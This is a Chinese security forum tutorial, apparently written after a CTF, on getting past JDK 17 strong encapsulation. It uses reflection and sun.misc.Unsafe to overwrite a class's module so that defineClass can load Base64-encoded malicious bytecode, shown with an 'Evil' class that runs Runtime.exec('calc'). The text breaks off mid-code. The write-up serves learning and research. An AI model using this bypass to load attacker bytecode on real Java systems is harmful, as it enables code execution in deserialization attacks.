---
title: JDK高版本的模块化以及反射类加载限制绕过
url: https://forum.butian.net/share/3748
source: 奇安信攻防社区
date: 2024-09-24
fetch_date: 2025-10-06T18:24:52.248955
---

# JDK高版本的模块化以及反射类加载限制绕过

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### JDK高版本的模块化以及反射类加载限制绕过

* [CTF](https://forum.butian.net/topic/52)

稍微学习了一下

JDK高版本的模块化以及反射类加载限制绕过
=====================
打巅峰极客的时候遇到的一个东西，觉得很有必要学习一下。当时题目直接给出“JDK17+CB”反序列化，我由于对高版本JDK有一种陌生的恐惧感，写EXP时有点畏手畏脚，最终导致题目没有做出来，赛后观摩了其他做出来师傅的WP，发现其实这个问题只要熟悉了就还能做。
JDK9之后的模块化
==========
Java模块化主要是用来解决依赖的问题，以及给原生JDK瘦身这两个作用。
在此之前，java项目一般都是由一堆class文件组成，管理这一堆class文件东西叫jar。但是这些class的有分两类，一类是我们自己项目的class，一类是各种依赖的class。jar可不会管他们之前的关系，他只是用来存放这些class的。所以一旦出现漏写某个依赖class所对应的jar，程序就会报"ClassNotFoundException"的异常了。
也正是为了避免这种问题，JDK9之后开始推行模块化，具体体现在：如果a.jar依赖于b.jar，那么对于a这个jar就需要写一份依赖说明，让a程序编译运行的时候能够直接定位到b.jar。这个功能主要就是通过`module-info.class`​中的定义的。
了解上述定义即可，现在主要是探究模块化关于漏洞利用这一块的限制。首先就是class的访问权限，一般就分为public protected private和默认的包访问限制，但是到了模块化之后折现访问权限就仅限于当前模块了，除非目标类所在模块明确在module-info中指出了该类可被外部调用，不然依然无法获取到。
‍
JDK17新特性--强封装
=============
<https://docs.oracle.com/en/java/javase/17/migrate/migrating-jdk-8-later-jdk-releases.html#GUID-7BB28E4D-99B3-4078-BDC4-FC24180CE82B>
Oracle官方上述文档中提到了`Strong Encapsulation`​，这个主要就是针对`java\*`​包下的所有非public字段的如果我们在JDK17的时候对`java\*`​下的非公共字段进行反射调用的话就会直接报错。
其实这个东西在JDK9之后就开始被标记为了不安全选项,但是由于很多大型项目之前都会直接使用反射这个功能，所以直到JDK17才将其强制化。
这里写一段示例代码：
```java
package org.example;
import java.lang.reflect.Method;
import java.util.Base64;
public class Test
{
public static void main( String[] args ) throws Exception {
String payload="yv66vgAAAD0AIAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgADgEABGNhbGMKAAgAEAwAEQASAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwcAFAEAE2phdmEvbGFuZy9FeGNlcHRpb24HABYBABBvcmcvZXhhbXBsZS9FdmlsAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABJMb3JnL2V4YW1wbGUvRXZpbDsBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhACEAFQACAAAAAAACAAEABQAGAAEAFwAAAC8AAQABAAAABSq3AAGxAAAAAgAYAAAABgABAAAAAwAZAAAADAABAAAABQAaABsAAAAIABwABgABABcAAABPAAIAAQAAAA64AAcSDbYAD1enAARLsQABAAAACQAMABMAAwAYAAAAEgAEAAAABgAJAAgADAAHAA0ACQAZAAAAAgAAAB0AAAAHAAJMBwATAAABAB4AAAACAB8=";
byte[] bytes= Base64.getDecoder().decode(payload);
Method defineClass= ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
defineClass.setAccessible(true);
defineClass.invoke(ClassLoader.getSystemClassLoader(), "attack", bytes, 0, bytes.length);
}
}
```
恶意字节码构成，注意这里不能有Package的定义：
```java
public class Evil {
static {
try{
Runtime.getRuntime().exec("calc");
}catch(Exception e){
}
}
}
```
理论上来说测试代码运行之后就会触发命令执行，但是在JDK17中就会出这样的报错，报错位置很容易定位到是SetAccessible中出了问题。
​![image](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-8baa47a264babbd7ead978be34204a47e3813599.png)​
但是JDK肯定不会就这么把反射这么强大的功能抛弃，他还是留了一手。先看看SetAccessible源码被改成什么样了
```java
public void setAccessible(boolean flag) throws SecurityException {
SecurityManager sm = System.getSecurityManager();
if (sm != null) sm.checkPermission(ACCESS\_PERMISSION);
setAccessible0(this, flag);
}
```
setAccessible0就是最终将当前反射获取到的变量中`override`​属性值设置为true，不论是JDK8还是JDK17都是如此。重点是checkPermission的区别,JDK17中checkPermission最终调用到了checkCanSetAccessible方法：
```java
private boolean checkCanSetAccessible(Class&lt;?&gt; caller,
Class&lt;?&gt; declaringClass,
boolean throwExceptionIfDenied) {
if (caller == MethodHandle.class) {
throw new IllegalCallerException(); // should not happen
}
Module callerModule = caller.getModule();
Module declaringModule = declaringClass.getModule();
//如果被调用的变量所在模块和调用者所在模块相同，返回true
if (callerModule == declaringModule) return true;
//如果调用者所在模块跟Object所在模块相同，则返回true
if (callerModule == Object.class.getModule()) return true;
//如果被调用模块没有定义，则返回true
if (!declaringModule.isNamed()) return true;
String pn = declaringClass.getPackageName();
int modifiers;
if (this instanceof Executable) {
modifiers = ((Executable) this).getModifiers();
} else {
modifiers = ((Field) this).getModifiers();
}
//如果当前被调用属性值是public，那就直接返回true
// class is public and package is exported to caller
boolean isClassPublic = Modifier.isPublic(declaringClass.getModifiers());
if (isClassPublic &amp;&amp; declaringModule.isExported(pn, callerModule)) {
// member is public
if (Modifier.isPublic(modifiers)) {
return true;
}
//如果被调用属性是protected并且是static，返回true
// member is protected-static
if (Modifier.isProtected(modifiers)
&amp;&amp; Modifier.isStatic(modifiers)
&amp;&amp; isSubclassOf(caller, declaringClass)) {
return true;
}
}
//如果在模块define中，定义了该属性值是open的，返回true
// package is open to caller
if (declaringModule.isOpen(pn, callerModule)) {
return true;
}
if (throwExceptionIfDenied) {
// not accessible
String msg = "Unable to make ";
if (this instanceof Field)
msg += "field ";
msg += this + " accessible: " + declaringModule + " does not \"";
if (isClassPublic &amp;&amp; Modifier.isPublic(modifiers))
msg += "exports";
else
msg += "opens";
msg += " " + pn + "\" to " + callerModule;
InaccessibleObjectException e = new InaccessibleObjectException(msg);
if (printStackTraceWhenAccessFails()) {
e.printStackTrace(System.err);
}
throw e;
}
return false;
}
```
总结几个返回true的可能性：
- 调用者所在模块和被调用者所在模块相同
- 调用者模块与Object类所在模块相同
后续以及其他的还有的返回true的情况是该属性值本身的定义所决定的，我们无法改变。针对上面三种情况，我们可以通过unsafe模块来达成目的。
Unsafe模块的作用还有很多，属于是积累起来很不错的一块知识点，这里我们只记录如何通过Unsafe模块进行目标类所在moule进行修改，整体的思路为：获取Object中module属性的内存偏移量，之后再通过unsafe中方法，将Object的module属性set进我们当前操作类的module属性中。
Unsafe修改类所属module
=================
Unsafe模块中有几个方法相关：
\*\*1.objectFieldOffset\*\*
​![image](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-a1b7a50017ce494b476f1b92026ebbd4b8ece907.png)​
用于获取给定类属性值的内存偏移量，用来找到module属性值的地方
\*\*2.getAndSetObject\*\*
​![image](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-c7e7c1c3b527addefd43fdece8cde7f023fc6be6.png)​
用来根据内存偏移量以及具体值，来给指定对象的内存空间进行变量设置，跟反射的功能差不多。
其实具体的操作有上述两个方法已经足够了，但unsafe中能够根据内存偏移量和具体值进行set操作的方法可不止这一个，比如putObject也可以实现这个功能，并且方法调用的给值都是相同的。
再看具体操作：
```java
package org.example;
import sun.misc.Unsafe;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
public class Test {
public static void main(String[] args) throws Exception {
String payload = "yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAoACwcAHQwAHgAfAQAEY2FsYwwAIAAhAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACIBAARFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAIAAQAKAAsAAQAMAAAAHQABAAEAAAAFKrcAAbEAAAABAA0AAAAGAAEAAAADAAgADgALAAEADAAAAFQAAwABAAAAF7gAAhIDtgAEV6cADUu7AAZZKrcAB7+xAAEAAAAJAAwABQACAA0AAAAWAAUAAAAGAAkACQAMAAcADQAIABYACgAPAAAABwACTAcAEAkAAQARAAAAAgAS";
byte[] bytes = Base64.getDecoder().decode(payload);
Class UnsafeClass=Class.forName("sun.misc.Unsafe");
Field unsafeField=UnsafeClass.getDeclaredField("theUnsafe");
unsafeField.setAccessible(true);
Unsafe unsafe=(Unsafe) unsafeField.get(null);
Module ObjectModule=Object.class.getModule();
Class currentClass=Test.class;
long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
unsafe.getAndSetObject(currentClass,addr,ObjectModule);
Method defineClass = ClassLoader.class.getDeclared...